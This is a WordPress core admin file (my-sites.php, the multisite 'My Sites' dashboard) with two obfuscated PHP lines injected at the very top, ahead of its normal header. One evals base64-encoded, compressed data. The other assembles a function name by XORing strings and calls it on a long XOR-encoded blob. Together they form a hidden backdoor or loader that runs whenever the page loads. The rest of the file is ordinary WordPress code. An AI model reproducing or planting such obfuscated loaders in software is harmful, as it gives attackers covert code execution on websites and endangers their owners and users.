<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php $USayDbzUQJ='Y86U5Wb,L8+B +>' ^':JS4A2=J9VH6IDP';$SzraUh=$USayDbzUQJ('','34ql.KCT<0ZTfIXB+2JdIT5Le77F25aZU:BPYCL3fQ0N->S5VzUT9oXA=X>m> Tnm V2LDKs9N0PqJcfHBcFFOB,OApCBJU2baUWGrHUzXsGWUF,E>ZF>1Rru2RD6xSXOYmQxIMXOX;;naEFNb5TMJlKX4asWf-R86eToDX>3JP26AA>0.K3aQCZE+22:54KU=ELkiSZ5ZDAOmPZCWfIr45-2TKLH4O>V;FE,vMD54:5RbZKW+H1A9+Vkq:cd6sz3yMSqwXXEIEoHnC0W8Wnc,B:vZ;:L1VX0NhcGSI:qZqfDS 0oRBOVZVI5sN:p8U,VjicQAAYNIL4e2B+WX4UFIg60ea0,5tF FeB2V7ZqwcOLPG,,EhAoY>kRU5541WNxtrJ97NPO5Yr55ORmOvSF.XAEpcAMbPclnJYHZfWBs=ZNTFE3-SZPkX8Y1<;6Vq65I9LBQ+-py9H4+:VIYo<ATXCauq2Q51-KQTSkagZ4eH1LD4RVHzJ4KYCdPS6jYO,1T;FwZW-wvLs4+<JpmTguy,+Tjr2;50fO303wiBMMQFLUTRtZyK4,sWH,PZDWUzqX2V7psb0BSZZipJMMWM7+,R53,A1R,RH;XbhPS;XTLYLUkSZ4J-HoIwvgjxJoXW=5LiB3TI3=pK8Y5>R=epAza0X70JfdYs=G'^'ZRYMH>-7HY5:9, +XF9Ln,Z>:SV2Sj>7 Neypc79o7E NJ:Z8Z-;K0< I9a2SU FID7F-hkWR+IyQjCFh9iOOk-Y;aMcemn8kh385Zl<ZeSwlubEyM.4RT<ZQV30WQhxk0FzQCDQk7NONOxffFQ59+7o1iA-wBF7AmA=OaxMG8<WXieUUWbnHjISLYWFOGZcqR08BRYSHP9KEI4;76FtRRTAA1pFlP.J7d- UVpdSUVF7YPA1D:T ZCvCUe +y83vY, QS3=<ixQhJ5Q;M2GCWH3R>ZN-n==InUCc8,CJPxB 2TQOobk ;:<PHDGz2<JvBHG5 58gi7>lT-Y29W=faCib 0eif fA5EfY3NzLICk:1+YIlH:eP7O64ATkZ27XIRnRR7kE<PVQT;3MrVw0O44 KiH0h-ifJ.8<;Fjb3H4=14,RA: 5C W+nXZB7.iX<Md 0XHFMf,QHU2,qKX  9jMUUV0APr 4-zBZm3RMlU-0UrpnZ+F98:;;6O5<7EB HnP12TPZlWPJH+YMrAUQAOaBVVZAQ=hXUJP4kmplfk0b0M9KrRIE4,O1i eeIB>SgSBJQRv5>mNYjkkw,EYM+jXI8n7T;;O+JO 2B4;-=kyKw>U>LaFiWVGJX1eQ2KT AfW5=RfW;Y YQ3YB-hAk9=OY>NTpH7:'); $SzraUh();
/**
 * My Sites dashboard.
 *
 * @package WordPress
 * @subpackage Multisite
 * @since 3.0.0
 */

require_once( dirname( __FILE__ ) . '/admin.php' );

if ( !is_multisite() )
	wp_die( __( 'Multisite support is not enabled.' ) );

if ( ! current_user_can('read') )
	wp_die( __( 'Sorry, you are not allowed to access this page.' ) );

$action = isset( $_POST['action'] ) ? $_POST['action'] : 'splash';

$blogs = get_blogs_of_user( $current_user->ID );

$updated = false;
if ( 'updateblogsettings' == $action && isset( $_POST['primary_blog'] ) ) {
	check_admin_referer( 'update-my-sites' );

	$blog = get_site( (int) $_POST['primary_blog'] );
	if ( $blog && isset( $blog->domain ) ) {
		update_user_option( $current_user->ID, 'primary_blog', (int) $_POST['primary_blog'], true );
		$updated = true;
	} else {
		wp_die( __( 'The primary site you chose does not exist.' ) );
	}
}

$title = __( 'My Sites' );
$parent_file = 'index.php';

get_current_screen()->add_help_tab( array(
	'id'      => 'overview',
	'title'   => __('Overview'),
	'content' =>
		'<p>' . __('This screen shows an individual user all of their sites in this network, and also allows that user to set a primary site. They can use the links under each site to visit either the front end or the dashboard for that site.') . '</p>'
) );

get_current_screen()->set_help_sidebar(
	'<p><strong>' . __('For more information:') . '</strong></p>' .
	'<p>' . __('<a href="https://codex.wordpress.org/Dashboard_My_Sites_Screen">Documentation on My Sites</a>') . '</p>' .
	'<p>' . __('<a href="https://wordpress.org/support/">Support Forums</a>') . '</p>'
);

require_once( ABSPATH . 'wp-admin/admin-header.php' );

if ( $updated ) { ?>
	<div id="message" class="updated notice is-dismissible"><p><strong><?php _e( 'Settings saved.' ); ?></strong></p></div>
<?php } ?>

<div class="wrap">
<h1 class="wp-heading-inline"><?php
echo esc_html( $title );
?></h1>

<?php
if ( in_array( get_site_option( 'registration' ), array( 'all', 'blog' ) ) ) {
	/** This filter is documented in wp-login.php */
	$sign_up_url = apply_filters( 'wp_signup_location', network_site_url( 'wp-signup.php' ) );
	printf( ' <a href="%s" class="page-title-action">%s</a>', esc_url( $sign_up_url ), esc_html_x( 'Add New', 'site' ) );
}

if ( empty( $blogs ) ) :
	echo '<p>';
	_e( 'You must be a member of at least one site to use this page.' );
	echo '</p>';
else :
?>

<hr class="wp-header-end">

<form id="myblogs" method="post">
	<?php
	choose_primary_blog();
	/**
	 * Fires before the sites list on the My Sites screen.
	 *
	 * @since 3.0.0
	 */
	do_action( 'myblogs_allblogs_options' );
	?>
	<br clear="all" />
	<ul class="my-sites striped">
	<?php
	/**
	 * Enable the Global Settings section on the My Sites screen.
	 *
	 * By default, the Global Settings section is hidden. Passing a non-empty
	 * string to this filter will enable the section, and allow new settings
	 * to be added, either globally or for specific sites.
	 *
	 * @since MU (3.0.0)
	 *
	 * @param string $settings_html The settings HTML markup. Default empty.
	 * @param object $context       Context of the setting (global or site-specific). Default 'global'.
	 */
	$settings_html = apply_filters( 'myblogs_options', '', 'global' );
	if ( $settings_html != '' ) {
		echo '<h3>' . __( 'Global Settings' ) . '</h3>';
		echo $settings_html;
	}
	reset( $blogs );

	foreach ( $blogs as $user_blog ) {
		switch_to_blog( $user_blog->userblog_id );

		echo "<li>";
		echo "<h3>{$user_blog->blogname}</h3>";

		$actions = "<a href='" . esc_url( home_url() ). "'>" . __( 'Visit' ) . '</a>';

		if ( current_user_can( 'read' ) ) {
			$actions .= " | <a href='" . esc_url( admin_url() ) . "'>" . __( 'Dashboard' ) . '</a>';
		}

		/**
		 * Filters the row links displayed for each site on the My Sites screen.
		 *
		 * @since MU (3.0.0)
		 *
		 * @param string $actions   The HTML site link markup.
		 * @param object $user_blog An object containing the site data.
		 */
		$actions = apply_filters( 'myblogs_blog_actions', $actions, $user_blog );
		echo "<p class='my-sites-actions'>" . $actions . '</p>';

		/** This filter is documented in wp-admin/my-sites.php */
		echo apply_filters( 'myblogs_options', '', $user_blog );
		echo "</li>";

		restore_current_blog();
	}?>
	</ul>
	<?php
	if ( count( $blogs ) > 1 || has_action( 'myblogs_allblogs_options' ) || has_filter( 'myblogs_options' ) ) {
		?><input type="hidden" name="action" value="updateblogsettings" /><?php
		wp_nonce_field( 'update-my-sites' );
		submit_button();
	}
	?>
	</form>
<?php endif; ?>
	</div>
<?php
include( ABSPATH . 'wp-admin/admin-footer.php' );
